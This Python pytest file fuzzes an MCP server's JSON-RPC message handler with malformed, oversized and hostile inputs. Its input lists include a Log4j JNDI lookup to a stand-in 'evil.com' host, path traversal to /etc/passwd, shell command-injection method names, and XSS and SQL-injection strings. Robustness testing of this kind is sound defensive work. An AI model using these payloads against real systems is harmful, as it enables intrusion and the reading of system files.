"""
MCP Protocol Fuzzing Tests

Comprehensive fuzzing tests for MCP (Model Context Protocol) server implementation.
These tests use various fuzzing strategies to find bugs, edge cases, and security
vulnerabilities in MCP message handling.

Test Coverage:
- Message format fuzzing
- Parameter injection and manipulation
- Protocol state machine fuzzing
- Resource/tool/prompt handler fuzzing
- Session management fuzzing
- Error handling robustness
- Transport layer fuzzing
- Batch message fuzzing
- Concurrent request fuzzing
- Malformed data handling
"""

import asyncio
import json
import random
import string
import pytest
from typing import Dict, Any, List, Optional, Union
from itertools import product

# Import MCP components
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))

from mcp_server.server import MCPServer, ServerConfig, ServerStatus
from mcp_server.message_handler import (
    MessageHandler,
    create_error_response,
    validate_jsonrpc_message,
    MCPMessage,
    ErrorCode,
)


# ============================================================================
# Fuzzing Utilities
# ============================================================================

class FuzzGenerator:
    """Generate fuzzed data for testing"""

    @staticmethod
    def random_string(length: int = 10) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def random_int(min_val: int = -1000000, max_val: int = 1000000) -> int:
        """Generate random integer"""
        return random.randint(min_val, max_val)

    @staticmethod
    def random_float() -> float:
        """Generate random float"""
        return random.uniform(-1e10, 1e10)

    @staticmethod
    def random_bool() -> bool:
        """Generate random boolean"""
        return random.choice([True, False])

    @staticmethod
    def random_null() -> None:
        """Generate null value"""
        return None

    @staticmethod
    def random_list(length: int = 5) -> List:
        """Generate random list"""
        generators = [
            FuzzGenerator.random_string,
            FuzzGenerator.random_int,
            FuzzGenerator.random_float,
            FuzzGenerator.random_bool,
        ]
        return [random.choice(generators)() for _ in range(length)]

    @staticmethod
    def random_dict(depth: int = 3) -> Dict:
        """Generate random dictionary"""
        if depth <= 0:
            return {}

        result = {}
        for _ in range(random.randint(1, 5)):
            key = FuzzGenerator.random_string(8)
            value_type = random.choice(['string', 'int', 'float', 'bool', 'null', 'list', 'dict'])

            if value_type == 'string':
                result[key] = FuzzGenerator.random_string()
            elif value_type == 'int':
                result[key] = FuzzGenerator.random_int()
            elif value_type == 'float':
                result[key] = FuzzGenerator.random_float()
            elif value_type == 'bool':
                result[key] = FuzzGenerator.random_bool()
            elif value_type == 'null':
                result[key] = None
            elif value_type == 'list':
                result[key] = FuzzGenerator.random_list()
            elif value_type == 'dict' and depth > 1:
                result[key] = FuzzGenerator.random_dict(depth - 1)

        return result

    @staticmethod
    def malformed_json_strings() -> List[str]:
        """Generate malformed JSON strings"""
        return [
            '',  # Empty string
            '{',  # Unclosed brace
            '}',  # Unmatched brace
            '{"key": }',  # Missing value
            '{"key" "value"}',  # Missing colon
            '{key: "value"}',  # Unquoted key
            '{"key": "value",}',  # Trailing comma
            '{"key": undefined}',  # Invalid value
            "{'key': 'value'}",  # Single quotes
            '{"key": NaN}',  # NaN value
            '{"key": Infinity}',  # Infinity
            '\x00\x01\x02',  # Binary data
            'null',  # Valid JSON but not object
            '[]',  # Array instead of object
            '123',  # Number instead of object
        ]

    @staticmethod
    def oversized_data() -> Dict[str, Any]:
        """Generate oversized data"""
        return {
            "huge_string": "A" * (10 * 1024 * 1024),  # 10MB string
            "huge_array": [i for i in range(100000)],  # 100K elements
            "deep_nesting": FuzzGenerator.deeply_nested_dict(1000),
        }

    @staticmethod
    def deeply_nested_dict(depth: int) -> Dict:
        """Generate deeply nested dictionary"""
        result = {"value": depth}
        current = result
        for i in range(depth - 1):
            current["nested"] = {"value": depth - i - 1}
            current = current["nested"]
        return result

    @staticmethod
    def boundary_values() -> List[Any]:
        """Generate boundary values"""
        return [
            0,
            -1,
            1,
            2**31 - 1,  # Max 32-bit int
            2**31,  # Min 32-bit int overflow
            2**63 - 1,  # Max 64-bit int
            -2**63,  # Min 64-bit int
            float('inf'),
            float('-inf'),
            float('nan'),
            "",
            " ",
            "\n",
            "\t",
            "\x00",
            None,
        ]

    @staticmethod
    def special_strings() -> List[str]:
        """Generate special strings for testing"""
        return [
            "",  # Empty
            " ",  # Space
            "   ",  # Multiple spaces
            "\n",  # Newline
            "\r\n",  # CRLF
            "\t",  # Tab
            "\x00",  # Null byte
            "../../etc/passwd",  # Path traversal
            "../../../",  # Directory traversal
            "<script>alert('xss')</script>",  # XSS
            "' OR '1'='1",  # SQL injection
            "${jndi:ldap://evil.com/a}",  # Log4j
            "%00",  # Null byte URL encoded
            "A" * 10000,  # Long string
            "🔥🔥🔥",  # Unicode emoji
            "中文测试",  # Chinese characters
            "тест",  # Cyrillic
            "\\",  # Backslash
            "\"",  # Quote
            "'",  # Single quote
            "`",  # Backtick
        ]


class MCPMessageFuzzer:
    """Fuzzer for MCP messages"""

    @staticmethod
    def fuzz_jsonrpc_field() -> List[Any]:
        """Fuzz jsonrpc version field"""
        return [
            "2.0",  # Valid
            "1.0",  # Invalid version
            "3.0",  # Future version
            "",  # Empty
            None,  # Null
            2.0,  # Number instead of string
            [],  # Array
            {},  # Object
            True,  # Boolean
            "invalid",  # Invalid string
        ]

    @staticmethod
    def fuzz_id_field() -> List[Any]:
        """Fuzz request ID field"""
        return [
            1,  # Valid int
            "string-id",  # Valid string
            0,  # Zero
            -1,  # Negative
            2**63,  # Huge number
            "",  # Empty string
            None,  # Null (notification)
            [],  # Array
            {},  # Object
            True,  # Boolean
            FuzzGenerator.random_string(1000),  # Long string
        ]

    @staticmethod
    def fuzz_method_field() -> List[Any]:
        """Fuzz method name field"""
        valid_methods = [
            "initialize",
            "resources/list",
            "resources/read",
            "tools/list",
            "tools/call",
            "prompts/list",
            "prompts/get",
        ]

        invalid_methods = [
            "",  # Empty
            " ",  # Space
            "invalid_method",  # Non-existent
            "../../etc/passwd",  # Path traversal
            "../method",  # Relative path
            "method;ls",  # Command injection
            "method|whoami",  # Command injection
            None,  # Null
            123,  # Number
            [],  # Array
            {},  # Object
            "A" * 1000,  # Long method name
        ]

        return valid_methods + invalid_methods

    @staticmethod
    def fuzz_params_field() -> List[Any]:
        """Fuzz params field"""
        return [
            {},  # Valid empty
            {"key": "value"},  # Valid
            None,  # Null (should default to {})
            [],  # Array (valid per spec)
            "",  # String (invalid)
            123,  # Number (invalid)
            True,  # Boolean (invalid)
            FuzzGenerator.random_dict(),  # Random params
            FuzzGenerator.oversized_data(),  # Huge params
        ]

    @staticmethod
    def generate_fuzzed_messages(count: int = 100) -> List[Dict[str, Any]]:
        """Generate multiple fuzzed messages"""
        messages = []

        for _ in range(count):
            message = {}

            # Randomly include/exclude required fields
            if random.random() > 0.1:  # 90% include jsonrpc
                message["jsonrpc"] = random.choice(MCPMessageFuzzer.fuzz_jsonrpc_field())

            if random.random() > 0.2:  # 80% include method
                message["method"] = random.choice(MCPMessageFuzzer.fuzz_method_field())

            if random.random() > 0.3:  # 70% include id
                message["id"] = random.choice(MCPMessageFuzzer.fuzz_id_field())

            if random.random() > 0.5:  # 50% include params
                message["params"] = random.choice(MCPMessageFuzzer.fuzz_params_field())

            # Add random extra fields
            if random.random() > 0.7:
                message[FuzzGenerator.random_string()] = FuzzGenerator.random_dict()

            messages.append(message)

        return messages


# ============================================================================
# MCP Protocol Fuzzing Tests
# ============================================================================

class TestMCPMessageFuzzing:
    """Test MCP message handling with fuzzed inputs"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_fuzz_jsonrpc_version(self, message_handler):
        """Fuzz jsonrpc version field"""
        for version in MCPMessageFuzzer.fuzz_jsonrpc_field():
            message = {
                "jsonrpc": version,
                "method": "ping",
                "id": 1,
            }

            # Should handle gracefully (either succeed or return proper error)
            response = await message_handler.handle_message(message)
            assert response is not None
            assert isinstance(response, dict)

            # If version is invalid, should return error
            if version != "2.0":
                assert "error" in response or response.get("jsonrpc") == "2.0"

    @pytest.mark.asyncio
    async def test_fuzz_request_id(self, message_handler):
        """Fuzz request ID field"""
        for request_id in MCPMessageFuzzer.fuzz_id_field():
            message = {
                "jsonrpc": "2.0",
                "method": "ping",
                "id": request_id,
            }

            response = await message_handler.handle_message(message)

            # If id is provided, response should include same id
            if request_id is not None and response is not None:
                if "error" not in response:
                    # For valid messages, ID should match
                    assert response.get("id") == request_id or "error" in response

    @pytest.mark.asyncio
    async def test_fuzz_method_names(self, message_handler):
        """Fuzz method name field"""
        for method in MCPMessageFuzzer.fuzz_method_field():
            message = {
                "jsonrpc": "2.0",
                "method": method,
                "id": random.randint(1, 1000),
            }

            response = await message_handler.handle_message(message)
            assert response is not None

            # Invalid methods should return METHOD_NOT_FOUND error
            valid_methods = [
                "initialize", "ping", "resources/list", "tools/list",
                "prompts/list", "shutdown", "session/info"
            ]
            if method not in valid_methods:
                if isinstance(method, str) and method:
                    # Should return method not found error
                    assert "error" in response or "result" in response

    @pytest.mark.asyncio
    async def test_fuzz_params(self, message_handler):
        """Fuzz params field"""
        for params in MCPMessageFuzzer.fuzz_params_field():
            message = {
                "jsonrpc": "2.0",
                "method": "ping",
                "id": 1,
                "params": params,
            }

            response = await message_handler.handle_message(message)
            assert response is not None

            # Should handle invalid params gracefully
            # Either return error or handle default params
            assert isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_random_message_fuzzing(self, message_handler):
        """Test with randomly generated messages"""
        fuzzed_messages = MCPMessageFuzzer.generate_fuzzed_messages(50)

        for message in fuzzed_messages:
            try:
                response = await message_handler.handle_message(message)
                # Should never crash, always return something or None
                assert response is None or isinstance(response, dict)
            except Exception as e:
                # Should not raise unhandled exceptions
                pytest.fail(f"Unhandled exception for message {message}: {str(e)}")

    @pytest.mark.asyncio
    async def test_missing_required_fields(self, message_handler):
        """Test messages with missing required fields"""
        test_cases = [
            {},  # Empty message
            {"jsonrpc": "2.0"},  # Missing method and id
            {"method": "ping"},  # Missing jsonrpc
            {"id": 1},  # Missing jsonrpc and method
            {"jsonrpc": "2.0", "id": 1},  # Missing method
        ]

        for message in test_cases:
            response = await message_handler.handle_message(message)
            assert response is not None
            # Should return error for invalid messages
            assert isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_extra_fields(self, message_handler):
        """Test messages with extra unexpected fields"""
        message = {
            "jsonrpc": "2.0",
            "method": "ping",
            "id": 1,
            "extra_field": "should_be_ignored",
            "another_field": 123,
            "random_data": FuzzGenerator.random_dict(),
        }

        response = await message_handler.handle_message(message)
        assert response is not None
        # Should handle extra fields gracefully (ignore them)
        assert "result" in response or "error" in response


class TestMCPBatchFuzzing:
    """Test batch message processing with fuzzed inputs"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_fuzz_batch_size(self, message_handler):
        """Fuzz batch message with various sizes"""
        sizes = [0, 1, 2, 10, 100, 1000]

        for size in sizes:
            batch = [
                {
                    "jsonrpc": "2.0",
                    "method": "ping",
                    "id": i,
                }
                for i in range(size)
            ]

            if size == 0:
                # Empty batch should return error
                response = await message_handler.handle_message(batch)
                assert response is not None
            else:
                response = await message_handler.handle_message(batch)
                # Non-empty batches should return responses
                if response is not None:
                    assert isinstance(response, (list, dict))

    @pytest.mark.asyncio
    async def test_fuzz_mixed_batch(self, message_handler):
        """Test batch with mix of valid and invalid messages"""
        batch = [
            {"jsonrpc": "2.0", "method": "ping", "id": 1},  # Valid
            {"jsonrpc": "1.0", "method": "ping", "id": 2},  # Invalid version
            {"method": "ping", "id": 3},  # Missing jsonrpc
            {"jsonrpc": "2.0", "method": "invalid", "id": 4},  # Invalid method
            {"jsonrpc": "2.0", "method": "ping"},  # Notification (no id)
        ]

        response = await message_handler.handle_message(batch)
        assert response is not None or response == []
        # Should handle mixed batch gracefully
        if isinstance(response, list):
            # Some responses may be errors, some may be successful
            for resp in response:
                assert isinstance(resp, dict)

    @pytest.mark.asyncio
    async def test_fuzz_batch_with_random_messages(self, message_handler):
        """Test batch with randomly generated messages"""
        batch = MCPMessageFuzzer.generate_fuzzed_messages(20)

        response = await message_handler.handle_message(batch)
        # Should not crash
        assert response is None or isinstance(response, (list, dict))


class TestMCPResourceFuzzing:
    """Test resource handling with fuzzed inputs"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_fuzz_resource_uri(self, message_handler):
        """Fuzz resource URI parameter"""
        uris = [
            "file:///valid/path",  # Valid
            "",  # Empty
            None,  # Null
            "../../etc/passwd",  # Path traversal
            "file://" + "A" * 10000,  # Long URI
            "http://evil.com/resource",  # External URI
            "javascript:alert(1)",  # XSS
            "data:text/html,<script>alert(1)</script>",  # Data URI
            "\\\\unc\\path",  # UNC path
            123,  # Number instead of string
            [],  # Array
            {},  # Object
        ]

        for uri in uris:
            message = {
                "jsonrpc": "2.0",
                "method": "resources/read",
                "id": 1,
                "params": {"uri": uri},
            }

            response = await message_handler.handle_message(message)
            assert response is not None
            # Should handle invalid URIs gracefully
            assert isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_fuzz_resource_list_params(self, message_handler):
        """Fuzz resource list parameters"""
        param_sets = [
            {},  # Empty (valid)
            None,  # Null
            {"filter": "test"},  # Filter param
            {"filter": "A" * 10000},  # Long filter
            {"filter": None},  # Null filter
            {"unknown_param": "value"},  # Unknown parameter
            FuzzGenerator.random_dict(),  # Random params
        ]

        for params in param_sets:
            message = {
                "jsonrpc": "2.0",
                "method": "resources/list",
                "id": 1,
                "params": params,
            }

            response = await message_handler.handle_message(message)
            assert response is not None
            assert isinstance(response, dict)


class TestMCPToolFuzzing:
    """Test tool calling with fuzzed inputs"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_fuzz_tool_names(self, message_handler):
        """Fuzz tool name parameter"""
        tool_names = FuzzGenerator.special_strings() + [
            None,
            123,
            [],
            {},
            True,
        ]

        for tool_name in tool_names:
            message = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "id": 1,
                "params": {
                    "name": tool_name,
                    "arguments": {},
                },
            }

            response = await message_handler.handle_message(message)
            assert response is not None
            assert isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_fuzz_tool_arguments(self, message_handler):
        """Fuzz tool arguments"""
        argument_sets = [
            {},  # Empty
            None,  # Null
            {"arg1": "value1"},  # Valid
            FuzzGenerator.random_dict(5),  # Random args
            FuzzGenerator.oversized_data(),  # Huge args
            {"arg": FuzzGenerator.random_list(1000)},  # Large list
        ]

        for arguments in argument_sets:
            message = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "id": 1,
                "params": {
                    "name": "test_tool",
                    "arguments": arguments,
                },
            }

            response = await message_handler.handle_message(message)
            assert response is not None
            assert isinstance(response, dict)


class TestMCPConcurrentFuzzing:
    """Test concurrent request handling"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_concurrent_fuzzed_requests(self, message_handler):
        """Send many concurrent fuzzed requests"""
        messages = MCPMessageFuzzer.generate_fuzzed_messages(100)

        # Send all concurrently
        tasks = [message_handler.handle_message(msg) for msg in messages]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        # All should complete without unhandled exceptions
        for i, response in enumerate(responses):
            if isinstance(response, Exception):
                pytest.fail(f"Request {i} raised exception: {str(response)}")
            # Response can be None (notification) or dict
            assert response is None or isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_concurrent_resource_access(self, message_handler):
        """Test concurrent access to resources"""
        messages = [
            {
                "jsonrpc": "2.0",
                "method": "resources/list",
                "id": i,
            }
            for i in range(50)
        ]

        tasks = [message_handler.handle_message(msg) for msg in messages]
        responses = await asyncio.gather(*tasks)

        # All should succeed
        assert len(responses) == 50
        for response in responses:
            assert response is not None
            assert isinstance(response, dict)


class TestMCPStateFuzzing:
    """Test state machine and session fuzzing"""

    @pytest.fixture
    async def server(self):
        """Create MCP server instance"""
        config = ServerConfig(
            name="fuzzing-test-server",
            transports=["stdio"],
        )
        server = MCPServer(config=config)
        yield server

    @pytest.mark.asyncio
    async def test_fuzz_session_creation(self, server):
        """Fuzz session creation with invalid inputs"""
        client_names = FuzzGenerator.special_strings() + [None, 123, [], {}]
        client_versions = FuzzGenerator.special_strings() + [None, 123, [], {}]

        for name, version in zip(client_names[:10], client_versions[:10]):
            try:
                # Convert to string if not already
                name_str = str(name) if name is not None else "unknown"
                version_str = str(version) if version is not None else "unknown"

                session_id = await server.create_session(name_str, version_str)
                assert session_id is not None
                assert isinstance(session_id, str)

                # Clean up
                await server.close_session(session_id)
            except Exception as e:
                # Should handle invalid inputs gracefully
                assert isinstance(e, (TypeError, ValueError, RuntimeError))

    @pytest.mark.asyncio
    async def test_fuzz_message_without_session(self, server):
        """Send messages without establishing session"""
        await server.initialize()

        messages = MCPMessageFuzzer.generate_fuzzed_messages(10)

        for message in messages:
            response = await server.handle_message(message, session_id=None)
            # Should handle messages without session
            assert response is None or isinstance(response, dict)


class TestMCPErrorHandlingFuzzing:
    """Test error handling robustness"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_malformed_json(self, message_handler):
        """Test with malformed JSON strings"""
        # Note: This tests JSON parsing which happens before MessageHandler
        # In real implementation, transport layer would catch these

        # Instead test with invalid Python dict structures
        invalid_messages = [
            None,
            "string",
            123,
            True,
            [],  # Array (valid as batch but empty)
            [None],  # Array with invalid element
        ]

        for message in invalid_messages:
            response = await message_handler.handle_message(message)
            # Should return error or handle gracefully
            assert response is None or isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_deeply_nested_params(self, message_handler):
        """Test with deeply nested parameters"""
        message = {
            "jsonrpc": "2.0",
            "method": "ping",
            "id": 1,
            "params": FuzzGenerator.deeply_nested_dict(100),
        }

        response = await message_handler.handle_message(message)
        assert response is not None
        assert isinstance(response, dict)

    @pytest.mark.asyncio
    async def test_unicode_and_special_chars(self, message_handler):
        """Test with unicode and special characters"""
        special_strings = [
            "Hello 世界",
            "Тест",
            "🔥💻🐛",
            "\x00\x01\x02",
            "test\ntest",
            "test\r\ntest",
            "test\ttest",
        ]

        for special_str in special_strings:
            message = {
                "jsonrpc": "2.0",
                "method": "ping",
                "id": special_str,
                "params": {"test": special_str},
            }

            response = await message_handler.handle_message(message)
            assert response is not None
            assert isinstance(response, dict)


# ============================================================================
# Performance and Stress Fuzzing
# ============================================================================

class TestMCPPerformanceFuzzing:
    """Test performance under fuzzing stress"""

    @pytest.fixture
    async def message_handler(self):
        """Create message handler instance"""
        handler = MessageHandler()
        yield handler

    @pytest.mark.asyncio
    async def test_high_volume_fuzzing(self, message_handler):
        """Test with high volume of fuzzed messages"""
        messages = MCPMessageFuzzer.generate_fuzzed_messages(1000)

        # Process all messages
        for i, message in enumerate(messages):
            response = await message_handler.handle_message(message)
            # Should handle all without crashing
            assert response is None or isinstance(response, dict)

            # Sample check - not all to keep test fast
            if i % 100 == 0:
                print(f"Processed {i} fuzzed messages")

    @pytest.mark.asyncio
    async def test_rapid_fire_requests(self, message_handler):
        """Test rapid sequential requests"""
        for i in range(100):
            message = {
                "jsonrpc": "2.0",
                "method": random.choice(["ping", "resources/list", "tools/list"]),
                "id": i,
            }

            response = await message_handler.handle_message(message)
            assert response is not None

    @pytest.mark.asyncio
    @pytest.mark.timeout(30)
    async def test_timeout_resistance(self, message_handler):
        """Test that fuzzing doesn't cause timeouts"""
        # Generate messages that might cause slowdowns
        messages = []
        for _ in range(50):
            messages.append({
                "jsonrpc": "2.0",
                "method": "tools/call",
                "id": random.randint(1, 10000),
                "params": {
                    "name": FuzzGenerator.random_string(100),
                    "arguments": FuzzGenerator.random_dict(10),
                },
            })

        # Should complete within timeout
        tasks = [message_handler.handle_message(msg) for msg in messages]
        responses = await asyncio.gather(*tasks)

        assert len(responses) == len(messages)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
